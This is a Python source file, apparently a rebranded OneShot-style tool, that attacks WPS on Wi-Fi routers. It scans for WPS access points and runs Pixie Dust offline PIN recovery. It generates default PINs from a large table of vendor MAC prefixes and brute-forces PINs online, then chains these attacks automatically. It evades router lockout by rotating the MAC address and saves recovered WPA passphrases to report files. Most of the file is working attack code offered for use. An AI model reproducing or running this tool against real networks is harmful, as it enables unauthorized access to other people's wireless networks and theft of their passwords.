...
# Fixed: Pixie Dust (drain restored), New UI (boxes + gaps)

import sys, subprocess, os, tempfile, shutil, re, codecs, socket, pathlib, time, random
from abc import ABC, abstractmethod
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
import collections, statistics, csv, json
...
except ImportError: Figlet = None


class Config:
    WPA_SUPPLICANT_TIMEOUT = 15
    WPS_TRANSACTION_TIMEOUT = 300
    SOCKET_TIMEOUT = 8
    PIXIEWPS_TIMEOUT = 45
    SCAN_TIMEOUT = 45
...
class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac; self._str_repr = self._int2mac(mac)
    ...
    def __iadd__(self, o):
        self._int_repr += o; self._str_repr = self._int2mac(self._int_repr); return self
    ...
    def random_mac(oui='02'):
        ...
        for _ in range(5): parts.append(f'{random.randint(0,255):02X}')
        return ':'.join(parts)
...
def truncate(s, length, postfix='…'):
    ow = _str_width(s)
    if ow <= length: return s + ' ' * (length - ow)
    pw = _str_width(postfix); max_a = length - pw
    cw, tr = 0, []
    for c in s:
        c_w = _str_width(c)
        if cw + c_w > max_a: break
        tr.append(c); cw += c_w
    r = ''.join(tr)
    if len(tr) < len(s): r += postfix
...
class WPSpin:
    ...
    VENDOR_DATABASE = {
        'TP-Link': ('5464D9','1C3BF3','60E327','B0487A','F81A67','F8D111','50465D','788CF5','C025E9','0023CD','0024B2','002719','105172','147CB8','18909F','349672','3C6A2A','403F8C','485D60','503CC8','5465F3','60E32B','645299','74EA3A','8481F4','90671C','989ECE','A42B8C','AC15A2','B0BE76','C005C2','CC2D8C','D807B6','E4D3F1','E8DE27','EC086B','F483CD','18A6F7','3C46D8','704F57','7C8BCA','90F652','C074AD','CE3D82','DC028E','1027F5','1C61B4','30DE4B','54AF97','002275','08863B','081075','0026CE','9897D1','E04136','B246FC','0008A1','C4A81D','9094E4','BCF685','50CCF8','841630','14CC20','34BA9A','B4944E','001D0F','002127','68FF7B','98DAC4','9C5322','B09575','CC81DA','E4C32A','000AEB','001333','001839','001A2F','001B2F','001E2A','00223F','002586','003192','502B73'),
        'Tenda': ('C83A35','502B73','C86C87','E8CD2D','00B00C','CC81DA','803F5D','685B35','D8322E','E03676','E47185','F0B429','14CF92','288088','58D56E','8C68C8'),
        ...
        'ZTE': ('386171','001915','3448ED','600308','88E3AB','9C1C12','AC63F9','CC96A0','F46D04','FC64BA','002293','002542','2053ED','68A0F6','80797A','D85D4C'),
        'Huawei': ('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','9CC172','ACE215','D07AB5','CCA223','F80113','F83DFF','4C09B4','4CAC0A','84742A','9CD24B','B075D5','C864C7','DC028E'),
        ...
        'Netgear': ('204E7F','A040A0','B03956','C03F0E','DCEF09','E0469A','E8FCAF','F87394','28C68E','4494FC','744401','9C3DCF'),
        'Linksys': ('149182','20AA4B','48F8B3','586D8F','6038E0','687F74','94103E','C05627','E89F80','F4EC38'),
        ...
        'Airocon': ('0007262F','000B2B4A','000EF4E7','001333B','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','F43E61'),
        ...
        'Broadcom': ('ACF1DF','988B5D','001AA9','14144B','EC6264','B8A386','C8BE19','7C034C','204E7F','4C17EB','18622C','7C03D8'),
        ...
        'D-Link': ('14D64D','1C7EE5','28107B','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','D8EB97','0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','340804','5CD998','C8BE19','C8D3A3','0015E9','00179A'),
        'D-Link v1': ('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','340804','5CD998','C8BE19','C8D3A3'),
        'ASUS': ('049226','04D9F5','08606E','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','D017C2','D850E6','E03F49','F832E4','00177C','001EA6','048D38','081077','081078','081079','083E5D','181E78','1C4419','2420C7','247F20','3C1E04','40F201','44E9DD','54B80A','64517E','64D954','6C198F','6C7220','6CFDB9','7C2664','84A423','88A6C6','8C10D4','904D4A','907282','94FBB2','A01B29','ACA213','B85510','B8EE0E','BC3400','BC9680','E4BEED','EC4C4D','F42853','F43E61','F46BEF','F8AB05','7062B8','78542E','C412F5','EC2280'),
        'Ubiquiti': ('002722','0418D6','24A43C','44D9E7','687251','74ACB9','788A20','802AA8','B4FBE4','DC9FDB','E063DA','F09FC2','FCECDA'),
        'MikroTik': ('000C42','18FD74','48A98A','4C5E0C','64D154','6C3B6B','744D28','78A3E4','B869F4','C4AD34','CC2DE0','DC2C6E','E48D8C'),
    ...
    VENDOR_ALGO = {
        'TP-Link':'pin24','Tenda':'pin24','Netis':'pin24','Xiaomi':'pin24','Xiaomi-MiWiFi':'pin24','ZTE':'pin24','Huawei':'pin24','Mercury':'pin24','Phicomm':'pin24','TotoLink':'pin24','iBall':'pin24','Digisol':'pin24','Beetel':'pin24','Wavlink':'pin24','Netgear':'pin24','Linksys':'pin24','Belkin':'pin24','Buffalo':'pin24','Motorola':'pin24','Arris':'pin24','SMC':'pin24','Ruckus':'pin24','USRobotics':'pin24','Hawking':'pin24','IOGear':'pin24','Zoom':'pin24','Ambit':'pin24','Western-Digital':'pin24','Sagemcom':'pin24','Pirelli':'pin24','Atlantis':'pin24','Sitecom':'pin24','AirTies':'pin24','DrayTek':'pin24','Billion':'pin24','NetComm':'pin24','Repotec':'pin24','Sapido':'pin24','SparkLAN':'pin24','Tecom':'pin24','Aztech':'pin24','Corega':'pin24','Ralink':'pin24','Atheros':'pin24','Trendchip':'pin24','MediaTek':'pin24','Ubiquiti':'pin24','MikroTik':'pin24','Fortinet':'pin24','Senao':'pin24','Gigabyte':'pin24','TRENDnet':'pin24','EnGenius':'pin24','ZyxEL':'pin24','Comtrend':'pin24','Planet':'pin24','LevelOne':'pin24','3Com':'pin24','Lapcare':'pin24','Ubee':'pin24','Hitron':'pin24','Compal':'pin24','Askey':'pin24',
        'ASUS':'pinASUS','Airocon':'pinAirocon','Broadcom':'pinBrcm1','Realtek':'pinRealtek1','D-Link':'pinDLink','D-Link v1':'pinDLink1','Cisco':'pinCisco','Edimax':'pinEdimax','Thomson':'pinThomson','ONO':'pinONO','Upvel':'pinUpvel','Onlime':'pinOnlime','UR-814AC':'pinUR814AC','UR-825AC':'pinUR825AC','DSL-2740R':'pinDSL2740R','H108L':'pinH108L',
    }
    ...
    def get_vendor(cls, mac):
        ...
        for vendor, ouis in cls.VENDOR_DATABASE.items():
            if clean.startswith(ouis): return vendor
        return 'Unknown'
    ...
    def getSuggested(self, mac):
        return [{'id':ID,'name':('Static — ' + self.algos[ID]['name'])
                 if self.algos[ID]['mode'] == self.ALGO_STATIC
                 else self.algos[ID]['name'],
                 'pin':self.generate(ID, mac)} for ID in self._suggest(mac)]
    ...
    def _suggest(self, mac):
        ...
        for vendor, ouis in self.VENDOR_DATABASE.items():
            if clean.startswith(ouis):
                ...
                if algo and algo not in suggested: suggested.append(algo)
    ...
    def pinDLink(self, m):
        nic = m.integer & 0xFFFFFF; pin = nic ^ 0x55AA55
...
class PixiewpsData:
    ...
    def got_all(self):
        return bool(self.pke and self.pkr and self.e_nonce and
                    self.authkey and self.e_hash1 and self.e_hash2)
...
class ConnectionStatus:
    def __init__(self):
        ...
        self.essid = ''; self.wpa_psk = ''; self.bssid = ''
        self.wps_disabled = False; self.wps_unreachable = False
...
class BruteforceStatus:
    def __init__(self):
        ...
        self.mask = ''; self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0; self.statistics_period = 5
    def display_status(self):
        ...
        UI.info(f'{pct:.2f}% complete ({avg:.2f} sec/pin)')
    def registerAttempt(self, mask):
        self.mask = mask; self.counter += 1; now = time.time()
        self.attempts_times.append(now - self.last_attempt_time)
        self.last_attempt_time = now
        if self.counter == self.statistics_period:
            self.counter = 0; self.display_status()


class LockState(Enum):
    CLEAN = 'clean'; WARNING = 'warning'; LOCKED = 'locked'; ROTATING = 'rotating'


@dataclass
class LockGuard:
    interface: str; bssid: str
    original_mac: str = ''; current_mac: str = ''
    fail_count: int = 0; rotation_count: int = 0
    lock_detected_at: float = 0.0; state: LockState = LockState.CLEAN

    def __post_init__(self): self.original_mac = self._get_interface_mac()
    def _get_interface_mac(self):
        try:
            r = subprocess.run(f'cat /sys/class/net/{self.interface}/address',
                               shell=True, capture_output=True, text=True, timeout=3)
            return r.stdout.strip().upper()
        except Exception: return ''
    def record_success(self):
        self.fail_count = 0; self.state = LockState.CLEAN
    def record_fail(self):
        self.fail_count += 1
        if self.fail_count >= Config.WPS_FAIL_THRESHOLD:
            self.state = LockState.LOCKED; self.lock_detected_at = time.time()
        else: self.state = LockState.WARNING
        return self.state
    def is_locked(self): return self.state == LockState.LOCKED
    def rotate_mac(self):
        if not Config.MAC_ROTATION_ENABLED:
            UI.warn('MAC rotation disabled'); return False
        if self.rotation_count >= Config.MAX_LOCK_RETRIES:
            UI.err(f'Max MAC rotations reached'); return False
        self.state = LockState.ROTATING
        new_mac = NetworkAddress.random_mac(oui='02')
        UI.lock(f'Rotating MAC: {self.original_mac} → {new_mac}')
        try:
            subprocess.run(f'ip link set {self.interface} down', shell=True, timeout=5, check=False)
            time.sleep(0.5)
            r = subprocess.run(f'ip link set {self.interface} address {new_mac}',
                               shell=True, capture_output=True, text=True, timeout=5)
            if r.returncode != 0:
                UI.err(f'MAC change failed: {r.stderr.strip()}')
                subprocess.run(f'ip link set {self.interface} up', shell=True, timeout=5, check=False)
                return False
            time.sleep(0.5)
            subprocess.run(f'ip link set {self.interface} up', shell=True, timeout=5, check=False)
            time.sleep(1.5)
            self.current_mac = new_mac; self.rotation_count += 1
            self.fail_count = 0; self.state = LockState.CLEAN
            time.sleep(Config.MAC_ROTATION_DELAY)
            UI.ok(f'MAC rotated to {new_mac} (#{self.rotation_count})')
            return True
        except Exception as e:
            UI.err(f'MAC rotation error: {e}'); return False
    def restore_mac(self):
        if not self.original_mac or not Config.MAC_ROTATION_ENABLED: return
        try:
            subprocess.run(f'ip link set {self.interface} down', shell=True, timeout=5, check=False)
            subprocess.run(f'ip link set {self.interface} address {self.original_mac}',
...
class Companion:
    ...
    def sendOnly(self, cmd):
        try: self.retsock.sendto(cmd.encode(), self.wpas_ctrl_path)
        except Exception as e: UI.err(f'sendOnly: {e}')
    ...
    def sendAndReceive(self, cmd):
        try:
            ...
            UI.err('Socket timeout'); return ''
        except Exception as e:
            UI.err(f'sendAndReceive: {e}'); return ''

    def drain_stdout(self):
        """CRITICAL: flush stale output before new attempt"""
        try:
            os.set_blocking(self.wpas.stdout.fileno(), False)
            while self.wpas.stdout.read(1024): pass
    ...
    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=''):
        ...
        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                ...
                if n == 5: UI.ok('First half valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                UI.warn('WSC NACK (wrong PIN)')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode: UI.pixie(f'E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode: UI.pixie(f'PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode: UI.pixie(f'PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode: UI.pixie(f'AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode: UI.pixie(f'E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode: UI.pixie(f'E-Hash2: {self.pixie_creds.e_hash2}')
            ...
            if 'SSID' in line: self.connection_status.essid = self.__decode_ssid(line)
            ...
            else: UI.ok(f'Associated with {bt}')
            ...
            if verbose: UI.info(f'Signal: {self.lastPwr}')
    ...
    def run_pixiewps(self, showcmd=False, full_range=False):
        ...
        except subprocess.TimeoutExpired: UI.err('Pixiewps timeout')
        return False
    ...
    def save_result(self, bssid, essid, wps_pin, wpa_psk):
        ...
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            ...
            if write_header: w.writerow(['Date','BSSID','ESSID','WPS PIN','WPA PSK'])
            w.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        json_file = filename + '.json'
        data = []
        if os.path.exists(json_file):
            try:
                with open(json_file, 'r', encoding='utf-8') as jf: data = json.load(jf)
                if not isinstance(data, list): data = []
            except Exception:
                shutil.copy2(json_file, json_file + '.bak'); data = []
        data.append({'date':dateStr,'bssid':bssid,'essid':essid,'wps_pin':wps_pin,'wpa_psk':wpa_psk})
        with open(json_file, 'w', encoding='utf-8') as jf: json.dump(data, jf, indent=4)
        UI.info('Saved to reports/')

    def save_pin(self, bssid, pin):
        filename = self.pixiewps_dir + f'{bssid.replace(":", "").upper()}.run'
        with open(filename, 'w') as f: f.write(pin)
        UI.info('PIN saved')

    def cleanup(self):
        try: self.lock_guard.restore_mac()
        except Exception: pass
        try: self.retsock.close()
        except Exception: pass
        try:
            self.wpas.terminate(); self.wpas.wait(timeout=2)
        except Exception:
            try: self.wpas.kill()
            except Exception: pass
        try:
            if self.wpas.stdout: self.wpas.stdout.close()
        except Exception: pass
...
class AttackEngine(ABC):
    name = 'Base'; description = 'Base engine'
    def __init__(self, companion):
        self.c = companion; self.generator = companion.generator; self.result = False
    @abstractmethod
    def run(self, bssid, **kwargs) -> bool: pass
    ...
    def _handle_lock(self):
        ...
        if state == LockState.LOCKED:
            ...
            if self.c.lock_guard.rotate_mac():
                UI.ok('Lock bypassed'); return True
            UI.err('Cannot bypass lock')
        return False

    def _wps_loop(self, bssid, pixiemode=False, pbc_mode=False):
        c = self.c; start = time.time()
        while True:
            try:
                res = c._Companion__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode,
                                                verbose=c.print_debug,
                                                bssid=bssid.lower() if bssid else '')
            except AttributeError:
                res = c.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode,
                                      verbose=c.print_debug,
                                      bssid=bssid.lower() if bssid else '')
            if not res: break
...
class MultiPinEngine(AttackEngine):
    name = 'Multi-PIN'; description = 'Try all suggested PINs'
    def run(self, bssid, **kwargs):
        ...
        UI.info(f'Candidates: {len(pins)}'); UI.divider()
        ...
        for i, entry in enumerate(pins, 1):
            ...
            if self.c.lock_guard.is_locked():
                if not self.c.lock_guard.rotate_mac():
                    UI.err('Cannot proceed'); return False
            single.pin = entry['pin']
            if single._wps_attempt(bssid, entry['pin']): return True
            if self.c.connection_status.wps_disabled:
                UI.err('WPS disabled — cannot proceed'); return False
        UI.err('All PINs failed'); return False


class PixieDustEngine(AttackEngine):
    name = 'Pixie Dust'; description = 'Offline PIN recovery'
    def __init__(self, companion, showcmd=False, force=False):
        super().__init__(companion); self.showcmd = showcmd; self.force = force
    def run(self, bssid, **kwargs):
        UI.section(f'Engine: {self.name}')
        UI.info(f'Target: {bssid}')
        ...
        try:
            ...
            with open(fn, 'r') as f: cached = f.readline().strip()
            ans = input(f'{UI.CYAN}[?] Use cached PIN {cached}? [n/Y]: {UI.RESET}')
            if ans.lower() != 'n': return self._try_pin(bssid, cached, store_on_fail=True)
        ...
        if not self._do_handshake(bssid, dummy):
            UI.err('Handshake failed'); return False
        if not self.c.pixie_creds.got_all():
            UI.err('Not enough data (router may have WPS off)'); return False
        pin = self.c.run_pixiewps(self.showcmd, self.force)
        if not pin:
            UI.err('Pixie Dust failed (firmware likely patched)'); return False
    ...
    def _do_handshake(self, bssid, pin):
        ...
        r = c.sendAndReceive(f'WPS_REG {bssid} {pin}')
        if 'OK' not in r:
            UI.err(f'Handshake rejected: {r.strip()}'); self._handle_lock(); return False
        self._wps_loop(bssid, pixiemode=True, pbc_mode=False)
        c.sendOnly('WPS_CANCEL')
        if c.connection_status.status == 'GOT_PSK': return True
        elif c.connection_status.status == 'WPS_FAIL': self._handle_lock()
        return True
    def _try_pin(self, bssid, pin, store_on_fail=False):
        for attempt in range(1, Config.PSK_RETRY_COUNT + 1):
            ...
            if single._wps_attempt(bssid, pin): return True
        ...
        if store_on_fail: self.c.save_pin(bssid, pin)
        return False


class BruteForceEngine(AttackEngine):
    name = 'Brute Force'; description = 'Online PIN bruteforce'
    def __init__(self, companion, start_pin=None, delay=None):
        super().__init__(companion); self.start_pin = start_pin; self.delay = delay
        ...
        if (not self.start_pin) or (len(self.start_pin) < 4):
            try:
                ...
                with open(fn, 'r') as f:
                    ...
                    if ans.lower() != 'n': mask = f.readline().strip()
                    else: raise FileNotFoundError
            except FileNotFoundError: mask = '0000'
        else: mask = self.start_pin[:7]
        try:
            self.bf_status.mask = mask
            if len(mask) == 4:
                f_half = self._first_half(bssid, mask)
                if f_half: self._second_half(bssid, f_half, '001')
            elif len(mask) == 7:
                self._second_half(bssid, mask[:4], mask[4:])
            return self.result
        except KeyboardInterrupt:
            UI.plain(); UI.warn('Aborting…')
            fn = self.c.sessions_dir + f'{bssid.replace(":", "").upper()}.run'
            with open(fn, 'w') as f: f.write(self.bf_status.mask)
            UI.info('Session saved'); raise
    def _first_half(self, bssid, start):
        ck = self.generator.checksum; f_half = start
        while int(f_half) < 10000:
            t = int(f_half + '000'); pin = f'{f_half}000{ck(t)}'
            if self.c.lock_guard.is_locked():
                if not self.c.lock_guard.rotate_mac(): return False
            engine = SinglePinEngine(self.c, pin)
            if engine._wps_attempt(bssid, pin):
                self.result = True; return False
            if self.c.connection_status.wps_disabled:
                UI.err('WPS disabled — stopping'); return False
            if self.c.connection_status.isFirstHalfValid():
                UI.ok('First half found'); return f_half
        ...
        UI.err('First half not found'); return False
    def _second_half(self, bssid, f_half, s_half):
        ck = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half); pin = f'{f_half}{s_half}{ck(t)}'
            if self.c.lock_guard.is_locked():
                if not self.c.lock_guard.rotate_mac(): return False
            engine = SinglePinEngine(self.c, pin)
            if engine._wps_attempt(bssid, pin):
                self.result = True; return pin
            if self.c.connection_status.last_m_message > 6: return pin
...
class PBCEngine(AttackEngine):
    name = 'PBC'; description = 'WPS Push Button'
    def run(self, bssid=None, **kwargs):
        UI.section(f'Engine: {self.name}')
        c = self.c
        if bssid:
            UI.warn(f'PBC to {bssid}…'); cmd = f'WPS_PBC {bssid}'
        else:
            UI.warn('PBC (any)…'); cmd = 'WPS_PBC'
        c.pixie_creds.clear(); c.connection_status.clear()
        c.drain_stdout()
        r = c.sendAndReceive(cmd)
        if 'OK' not in r:
            UI.err(f'PBC rejected: {r.strip()}'); return False
...
class AutoChainEngine(AttackEngine):
    name = 'Auto Chain'; description = 'Cascade Pixie → Multi-PIN → Bruteforce'
    def __init__(self, companion, showcmd=False, force=False, allow_bruteforce=True):
        super().__init__(companion); self.showcmd = showcmd
        self.force = force; self.allow_bruteforce = allow_bruteforce
    def run(self, bssid, **kwargs):
        UI.section(f'Engine: {self.name}')
        UI.info(f'Target: {bssid}')
        UI.info(f'Vendor: {UI.BOLD}{WPSpin.get_vendor(bssid)}{UI.RESET}')
        UI.info(f'Chain: Pixie → Multi-PIN' + (' → Bruteforce' if self.allow_bruteforce else ''))
        UI.stage('Stage 1/3: Pixie Dust')
        try:
            if PixieDustEngine(self.c, self.showcmd, self.force).run(bssid): return True
        except Exception as e: UI.err(f'Pixie error: {e}')
        if self.c.connection_status.wps_disabled:
            UI.err('WPS disabled — aborting chain'); return False
        UI.stage('Stage 2/3: Multi-PIN')
        try:
            if MultiPinEngine(self.c).run(bssid): return True
        except Exception as e: UI.err(f'Multi-PIN error: {e}')
        if self.c.connection_status.wps_disabled:
            UI.err('WPS disabled — aborting chain'); return False
        if self.allow_bruteforce:
            ...
            try:
                ...
                if ans.lower() != 'n':
                    if BruteForceEngine(self.c).run(bssid): return True
            except KeyboardInterrupt: UI.warn('Bruteforce skipped')
        UI.err('AutoChain exhausted'); return False


class EngineRegistry:
    ENGINES = {'single':SinglePinEngine,'multi-pin':MultiPinEngine,'pixie':PixieDustEngine,
               'bruteforce':BruteForceEngine,'pbc':PBCEngine,'auto':AutoChainEngine}
    @classmethod
    ...
    @classmethod
    def get(cls, name): return cls.ENGINES.get(name)
...
class WiFiScanner:
    def __init__(self, interface, vuln_list=None, reverse_scan=False):
        ...
        except FileNotFoundError: self.stored = []
    ...
    def iw_scanner(self):
        ...
        def h_essid(line, result, networks): networks[-1]['ESSID'] = self._decode(result.group(1))
        def h_level(line, result, networks): networks[-1]['Level'] = int(float(result.group(1)))
        ...
        def h_wps(line, result, networks): networks[-1]['WPS'] = result.group(1)
        def h_wpslock(line, result, networks):
            if int(result.group(1), 16): networks[-1]['WPS locked'] = True
        def h_model(line, result, networks): networks[-1]['Model'] = self._decode(result.group(1))
        def h_modelno(line, result, networks): networks[-1]['Model number'] = self._decode(result.group(1))
        def h_device(line, result, networks): networks[-1]['Device name'] = self._decode(result.group(1))
        ...
        try:
            ...
            UI.err('Scan timeout'); return False
        if proc.returncode != 0:
            UI.err('iw scan failed'); return False
        ...
        for line in proc.stdout.splitlines():
            if line.startswith('command failed:'):
                UI.err(f'Scan error: {line}'); return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res: handler(line, res, networks)
        ...
        # Header
        print(f'  {UI.GRAY}{"#":<4}{"BSSID":<18}{"ESSID":<16}'
              f'{"Sec":<8}{"PWR":<5}{"Vendor":<12}Model{UI.RESET}')
        print(f'  {UI.GRAY}{"─" * 68}{UI.RESET}')

        items = list(network_list.items())
        if self.reverse_scan: items = items[::-1]
        for n, network in items:
            ...
            # Boxed number
            num_box = f'[{UI.YELLOW}{UI.BOLD}{n:>2}{UI.RESET}]'
            body = (f'{network["BSSID"]:<18}{essid} '
    ...
    def prompt_network(self):
        ...
        if not networks:
            UI.err('No WPS networks found.'); return ''
        while True:
            try:
                no = input(f'{UI.CYAN}Select target (Enter = refresh): {UI.RESET}').strip()
                if no.lower() in ('r', '0', ''): return self.prompt_network()
                if int(no) in networks.keys(): return networks[int(no)]['BSSID']
                raise IndexError
            except Exception: UI.err('Invalid number')
...
def die(msg):
    UI.err(msg); sys.exit(1)


def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    if Figlet:
        try: print(f'{UI.CYAN}{Figlet(font="slant").renderText("NOYON")}{UI.RESET}')
        except Exception: pass
...
if __name__ == '__main__':
    ...
    parser.add_argument('--auto', action='store_true', help='AutoChain: Pixie → Multi-PIN → Bruteforce')
    ...
    if args.list_engines:
        EngineRegistry.list_engines(); sys.exit(0)
    if sys.hexversion < 0x03060F0: die('Requires Python 3.6+')
    if os.getuid() != 0: die('Run as root')
    ...
    if args.mtk_wifi:
        ...
        if not wmt.is_char_device(): die('MediaTek Wi-Fi not found')
        wmt.chmod(0o644); wmt.write_text('1')
    ...
    try:
        while True:
            try:
                ...
                engine = None
                if args.pbc: engine = PBCEngine(companion)
                elif args.bruteforce: engine = BruteForceEngine(companion, args.pin, args.delay)
                elif args.auto: engine = AutoChainEngine(companion, args.show_pixie_cmd, args.pixie_force, True)
                elif args.multi_pin: engine = MultiPinEngine(companion)
                elif args.pixie_dust: engine = PixieDustEngine(companion, args.show_pixie_cmd, args.pixie_force)
                elif args.bssid and args.pin: engine = SinglePinEngine(companion, args.pin)
                elif args.bssid: engine = MultiPinEngine(companion)
                else: UI.err('No target specified'); break

                if args.pbc: success = engine.run()
                else:
                    if not args.bssid: UI.err('No BSSID specified'); break
                    success = engine.run(args.bssid)

                if success: UI.ok('Attack succeeded!')
                else:
                ...
                try: companion.cleanup()
                except Exception: pass
                companion = None; args.bssid = None
            except KeyboardInterrupt:
                if args.loop:
                    if input(f'\n{UI.CYAN}[?] Exit? [N/y]: {UI.RESET}').lower() == 'y':
                        UI.warn('Aborting…'); break
                    args.bssid = None
                else:
                    UI.plain(); UI.warn('Aborting…'); break
    finally:
        if companion is not None:
            try: companion.cleanup()
            except Exception: pass

    if args.iface_down: ifaceUp(args.interface, down=True)
    if args.mtk_wifi: wmt.write_text('0')
    sys.exit(exit_code)
